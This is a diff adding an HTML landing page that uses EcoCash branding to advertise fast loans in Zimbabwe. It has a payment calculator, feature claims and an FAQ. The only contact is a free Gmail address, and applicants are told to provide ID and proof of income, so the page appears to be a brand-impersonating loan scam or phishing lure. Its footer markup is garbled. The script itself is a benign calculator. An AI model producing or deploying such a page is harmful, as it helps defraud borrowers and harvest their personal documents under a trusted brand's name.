@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>EcoCash - Fast Loans in Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; margin: 0; padding: 0; }
+        body { font-family: 'Nunito', sans-serif; background: #f7f9fc; color: #1a1a1a; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { background: white; padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e5e5e5; position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 1.5rem; font-weight: 800; cursor: pointer; letter-spacing: -0.3px; }
+        .logo span.blue { color: #003087; }
+        .logo span.red { color: #d0021b; }
+        .menu { font-size: 1.5rem; cursor: pointer; color: #1a1a1a; transition: opacity 0.2s; }
+        .menu:hover { opacity: 0.7; }
+        .container { flex: 1; max-width: 500px; margin: 0 auto; padding: 1.5rem; width: 100%; }
+        .hero { text-align: center; margin-bottom: 2rem; }
+        .hero h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 0.75rem; color: #1a1a1a; letter-spacing: -0.4px; }
+        .hero p { color: #666; font-size: 0.95rem; line-height: 1.6; }
+        .calculator { background: white; border-radius: 20px; padding: 1.5rem; box-shadow: 0 2px 12px rgba(0,0,0,0.08); margin-bottom: 2rem; }
+        .calc-title { font-weight: 800; font-size: 1.1rem; margin-bottom: 1.5rem; color: #1a1a1a; letter-spacing: -0.3px; }
+        .slider-group { margin-bottom: 1.5rem; }
+        .slider-header { display: flex; justify-content: space-between; margin-bottom: 0.5rem; }
+        .slider-header .label { color: #1a1a1a; font-weight: 800; font-size: 0.95rem; }
+        .slider-header .value { color: #003087; font-weight: 800; font-size: 1rem; }
+        input[type=range] { width: 100%; height: 6px; background: #e0e0e0; border-radius: 4px; outline: none; margin: 0.75rem 0 0.5rem 0; -webkit-appearance: none; appearance: none; }
+        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 22px; height: 22px; border-radius: 50%; background: #003087; cursor: pointer; box-shadow: 0 2px 6px rgba(0,48,135,0.3); transition: box-shadow 0.2s; }
+        input[type=range]::-webkit-slider-thumb:hover { box-shadow: 0 4px 12px rgba(0,48,135,0.4); }
+        input[type=range]::-moz-range-thumb { width: 22px; height: 22px; border-radius: 50%; background: #003087; cursor: pointer; border: none; box-shadow: 0 2px 6px rgba(0,48,135,0.3); transition: box-shadow 0.2s; }
+        input[type=range]::-moz-range-thumb:hover { box-shadow: 0 4px 12px rgba(0,48,135,0.4); }
+        .range-labels { display: flex; justify-content: space-between; font-size: 0.75rem; color: #999; }
+        .rate-info { font-size: 0.8rem; color: #666; text-align: center; margin-bottom: 1rem; padding: 0.75rem; background: #f0f4ff; border-radius: 12px; font-weight: 600; }
+        .payment-box { background: #eef4ff; border: 2px solid #003087; border-radius: 16px; padding: 1.25rem; display: flex; justify-content: space-between; align-items: center; margin: 1.5rem 0; }
+        .payment-label { color: #666; font-size: 0.9rem; font-weight: 700; }
+        .payment-amount { font-size: 1.8rem; font-weight: 800; color: #003087; }
+        .btn-primary { display: block; width: 100%; padding: 1rem; background: #003087; color: white; border: none; border-radius: 16px; font-size: 1.1rem; font-weight: 800; cursor: pointer; text-decoration: none; text-align: center; text-transform: uppercase; transition: background 0.2s; letter-spacing: 0.5px; }
+        .btn-primary:hover { background: #002060; }
+        .btn-primary:active { transform: scale(0.98); }
+        .features { display: grid; gap: 1rem; margin-top: 2rem; }
+        .feature { display: flex; align-items: center; gap: 1rem; padding: 1rem; background: white; border-radius: 16px; box-shadow: 0 1px 6px rgba(0,0,0,0.06); transition: transform 0.2s, box-shadow 0.2s; }
+        .feature:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .feature-icon { font-size: 2rem; flex-shrink: 0; }
+        .feature-text h4 { font-size: 0.95rem; font-weight: 800; color: #1a1a1a; margin-bottom: 0.2rem; }
+        .feature-text p { font-size: 0.8rem; color: #888; }
+        .faq-section { margin-top: 2rem; padding: 1.5rem; background: white; border-radius: 16px; box-shadow: 0 1px 6px rgba(0,0,0,0.06); }
+        .faq-section h3 { font-size: 1rem; font-weight: 800; margin-bottom: 1rem; color: #1a1a1a; }
+        .faq-item { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #f0f0f0; }
+        .faq-item:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+        .faq-q { font-weight: 800; color: #003087; font-size: 0.9rem; margin-bottom: 0.4rem; }
+        .faq-a { font-size: 0.85rem; color: #666; line-height: 1.5; }
+        .footer { text-align: center; padding: 1.5rem 1rem; font-size: 0.8rem; color: #aaa; margin-top: 2rem; }
+        @media (max-width: 480px) { .container { padding: 1rem; } .logo { font-size: 1.3rem; } .hero h1 { font-size: 1.5rem; } .calculator { padding: 1.25rem; } .payment-amount { font-size: 1.5rem; } .features { gap: 0.75rem; } .feature { padding: 0.75rem; } .feature-icon { font-size: 1.5rem; } }
+    </style>
+</head>
+<body>
+<div class="header">
+    <div class="logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
+    <div class="menu">☰</div>
+</div>
+<div class="container">
+    <div class="hero">
+        <h1>Fast Loans for Zimbabwe</h1>
+        <p>Get approved in minutes • Flexible repayment • Secure & trusted</p>
+    </div>
+    <div class="calculator">
+        <div class="calc-title">Loan Calculator</div>
+        <div class="slider-group">
+            <div class="slider-header">
+                <span class="label">Loan Amount</span>
+                <span class="value" id="amount-display">ZWL 25,000</span>
+            </div>
+            <input type="range" id="amount-slider" min="1000" max="50000" step="1000" value="25000" />
+            <div class="range-labels"><span>ZWL 1,000</span><span>ZWL 50,000</span></div>
+        </div>
+        <div class="slider-group">
+            <div class="slider-header">
+                <span class="label">Repayment Period</span>
+                <span class="value" id="term-display">12 months</span>
+            </div>
+            <input type="range" id="term-slider" min="6" max="60" step="6" value="12" />
+            <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+        </div>
+        <div class="rate-info">
+            Interest rate: 18% per annum
+        </div>
+        <div class="payment-box">
+            <span class="payment-label">Monthly Payment</span>
+            <span class="payment-amount" id="monthly-payment">ZWL 2,289</span>
+        </div>
+        <a href="/loan-application" class="btn-primary">APPLY NOW</a>
+    </div>
+    <div class="features">
+        <div class="feature">
+            <div class="feature-icon">⚡</div>
+            <div class="feature-text"><h4>Instant Approval</h4><p>Within 30 minutes</p></div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">📱</div>
+            <div class="feature-text"><h4>Digital Process</h4><p>Apply from your phone</p></div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">💪</div>
+            <div class="feature-text"><h4>No Collateral</h4><p>No security needed</p></div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">🔒</div>
+            <div class="feature-text"><h4>Secure & Safe</h4><p>Bank-grade encryption</p></div>
+        </div>
+    </div>
+    <div class="faq-section">
+        <h3>Common Questions</h3>
+        <div class="faq-item">
+            <div class="faq-q">How fast can I get the money?</div>
+            <div class="faq-a">Once approved, funds are transferred to your EcoCash wallet within 24 hours.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q">What do I need to apply?</div>
+            <div class="faq-a">A valid EcoCash wallet, your ID, and proof of income. The process takes just 5 minutes.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q">What is the interest rate?</div>
+            <div class="faq-a">We charge 18% per annum on all loans. Exact amount depends on your loan amount and period.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q">Can I repay early?</div>
+            <div class="faq-a">Yes! You can settle anytime without penalties. You'll only pay interest up to settlement date.</div>
+        </div>
+    </div>
+</div>
+<div class="footer">
+    © 2026 EcoCash <div class="footer">© 2026 EcoCash</div>nbsp;·<div class="footer">© 2026 EcoCash</div>nbsp;
+    <a href="mailto:loansecocash8@gmail.com" style="color:#aaa;">loansecocash8@gmail.com</a>
+</div>
+<script>
+    const amountSlider = document.getElementById('amount-slider');
+    const termSlider = document.getElementById('term-slider');
+    const amountDisplay = document.getElementById('amount-display');
+    const termDisplay = document.getElementById('term-display');
+    const monthlyDisplay = document.getElementById('monthly-payment');
+
+    function updateCalculator() {
+        const amount = parseInt(amountSlider.value);
+        const term = parseInt(termSlider.value);
+        const annualRate = 0.18;
+        const monthlyRate = annualRate / 12;
+        const numPayments = term;
+        const numerator = monthlyRate * Math.pow(1 + monthlyRate, numPayments);
+        const denominator = Math.pow(1 + monthlyRate, numPayments) - 1;
+        const monthlyPayment = amount * (numerator / denominator);
+
+        amountDisplay.textContent = 'ZWL ' + amount.toLocaleString();
+        termDisplay.textContent = term + ' months';
+        monthlyDisplay.textContent = 'ZWL ' + Math.round(monthlyPayment).toLocaleString();
+    }
+
+    amountSlider.addEventListener('input', updateCalculator);
+    termSlider.addEventListener('input', updateCalculator);
+
+    document.querySelector('.menu').addEventListener('click', function() {
+        alert('Menu coming soon!');
+    });
+
+    updateCalculator();
+</script>
+<script src="/chat-widget.js"></script>
+</body>
+</html>
